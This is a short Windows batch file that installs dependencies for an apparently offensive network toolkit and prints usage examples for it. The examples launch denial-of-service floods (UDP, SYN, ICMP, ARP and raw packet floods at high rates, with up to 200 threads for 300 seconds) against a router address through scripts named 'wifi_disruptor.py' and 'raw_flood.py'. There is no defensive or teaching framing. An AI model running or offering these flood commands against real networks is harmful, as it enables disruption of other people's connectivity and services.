@echo off
echo Installing required dependencies...
pip install -r requirements.txt
echo.
echo Installation complete!
echo.
echo Usage examples:
echo.
echo Basic WiFi disruption:
echo   python wifi_disruptor.py 192.168.1.1
echo.
echo Advanced attack with custom settings:
echo   python wifi_disruptor.py 192.168.1.1 --rate 50000 --duration 300 --threads 100 --attacks udp,syn,icmp,arp
echo.
echo Raw packet flood (requires admin):
echo   python raw_flood.py 192.168.1.1 --type syn --threads 200 --duration 300
echo.
pause